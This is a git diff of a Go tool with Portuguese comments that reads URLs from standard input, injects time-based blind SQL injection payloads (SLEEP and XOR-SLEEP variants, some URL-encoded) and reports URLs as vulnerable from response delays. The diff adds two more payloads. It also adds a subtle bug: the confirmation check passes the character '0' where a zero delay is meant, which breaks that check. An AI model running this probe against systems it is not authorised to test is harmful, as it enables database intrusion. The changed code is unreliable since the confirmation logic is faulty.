@@ -73,32 +73,33 @@ func replacePayloads(baseURL string, tempoSQLi float64, payloads []string) []str
 }
 
 func testarURLs(tempoSQLi float64, payloads []string) {
-	scanner := bufio.NewScanner(os.Stdin)
+        scanner := bufio.NewScanner(os.Stdin)
 
-	for scanner.Scan() {
-		url := strings.TrimSpace(scanner.Text())
+        for scanner.Scan() {
+                url := strings.TrimSpace(scanner.Text())
 
-		// Substituir "FUZZ" e "tempoSQLi" pelos payloads nas URLs
-		resultURLs := replacePayloads(url, tempoSQLi, payloads)
-		
-		for _, url := range resultURLs {
-			tempoRetorno := medirTempoRequisicao(url)
-			if tempoRetorno >= tempoSQLi && tempoRetorno < 30 {
-				tempoRetorno2 := medirTempoRequisicao(url)
-				if tempoRetorno2 >= tempoSQLi && tempoRetorno2 < 30{
-					//Testando logica
-					for _, url_zero := range replacePayloads(url, 0, payloads) {
-					    tempoRetorno3 := medirTempoRequisicao(url_zero)
-					    if tempoRetorno3 < tempoSQLi {
-						fmt.Printf("%sVulnerable: %s%s - R1: {%f} - R2:{%f} - R3:{%f}\n", red, url, reset, tempoRetorno, tempoRetorno2, tempoRetorno3)
-					    }
-					}
-				}
-			} else {
-				fmt.Printf("%sNot Vulnerable: %s%s\n", gray, url, reset)
-			}
-		}
-	}
+                // Substituir "FUZZ" e "tempoSQLi" pelos payloads nas URLs
+                resultURLs := replacePayloads(url, tempoSQLi, payloads)
+
+                for _, url_teste := range resultURLs {
+                        tempoRetorno := medirTempoRequisicao(url_teste)
+                        if tempoRetorno >= tempoSQLi && tempoRetorno < 30 {
+                                tempoRetorno2 := medirTempoRequisicao(url_teste)
+                                if tempoRetorno2 >= tempoSQLi && tempoRetorno2 < 30{
+                                        //Testando logica
+                                        for _, url_zero := range replacePayloads(url, '0', payloads) {
+                                            tempoRetorno3 := medirTempoRequisicao(url_zero)
+                                                fmt.Printf("%f",tempoRetorno3)
+                                            if tempoRetorno3 < tempoSQLi {
+                                                fmt.Printf("%sVulnerable: %s%s - R1: {%f} - R2:{%f} - R3:{%f}\n", red, url_teste, reset, tempoRetorno, tempoRetorno2, tempoRetorno3)
+                                            }   
+                                        }
+                                }
+                        } else {
+                                fmt.Printf("%sNot Vulnerable: %s%s\n", gray, url_teste, reset)
+                        }
+                }
+        }
 }
 
 func main() {
@@ -125,6 +126,8 @@ func main() {
 		"/'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
 		"%27%20AND%20SLEEP(tempoSQLi)%23",
 		"') or SLEEP(tempoSQLi)--",
+		"'%20AND%20SLEEP(tempoSQLi)%23",
+		"'%20AND%20SLEEP(tempoSQLi)--",	
 	}
 
 	testarURLs(tempoSQLi, payloads)
